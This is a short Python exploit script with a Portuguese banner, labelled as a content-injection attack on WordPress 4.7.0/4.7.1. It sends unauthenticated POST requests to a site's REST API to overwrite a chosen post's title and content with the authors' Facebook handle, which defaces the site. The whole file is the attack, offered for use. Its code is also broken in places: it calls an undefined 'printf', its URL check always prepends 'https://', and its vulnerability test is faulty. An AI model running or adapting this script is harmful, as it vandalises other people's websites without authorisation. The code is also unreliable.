#!/usr/bin/python
#-*- coding: utf-8 -*-


from requests import post, get
from sys import argv


pay_user = "www.facebook.com/yunkers01" # MENSAGEM QUE SUBSTITUIRA O POST
menu = """
__  __            __                  ______   Recoda nao comedia!
\ \/ /_  ______  / /_____  __________/ ____/_______ _      __
 \  / / / / __ \/ //_/ _ \/ ___/ ___/ /   / ___/ _ \ | /| / /
 / / /_/ / / / / ,< /  __/ /  (__  ) /___/ /  /  __/ |/ |/ /
/_/\__,_/_/ /_/_/|_|\___/_/  /____/\____/_/   \___/|__/|__/
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 # Wordpress 4.7.0 / 4.7.1 Content Injection exploit
 # Escrito por Supr3m0 & w4rlo6k
 # Contato: www.facebook.com/yunkers01/
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"""


if len(argv) >= 5:
    if argv[1] == "--url" and argv[3] == "--post":
        print("\nUrl: {url}\nID: {id}".format(url=argv[2], id=argv[4]))
        url = argv[2]
        posts = argv[4]
        if url[:8] != "https://" or url[:7] != "http://":
            url = "https://"+url
    else:
        print("Parametros invalidos\nUse python3 reke.py --url site --post id")
        exit()
else:
    print("Parametros invalidos.")
    exit()


def inject():
    dir_vulneravel = url + "/wp-json/wp/v2/posts/{}".format(posts)
    headers = {"title": pay_user,
            "content": pay_user}
    req = post(dir_vulneravel, data=headers)
    if req.status_code != 403:
        if 'error' in req.text or 'rest_cannot_edit' in req.text:
            print("Não vulneravel. (Sem premissão para alterar)")
        else:
            printf("[SUCESSO] Post {} alterado com sucesso".format(post))
    else:
        print("Impossível conectar a url")


checa = get(url)
if checa.status_code != 403:
    vuln = "status" and "id" and "title"
    if vuln in checa.text:
        print("[INFO] Site parece ser vulneravel, enviando payload(...)")
        inject()
    else:
        print("[ERRO] Site nao vulneravel.")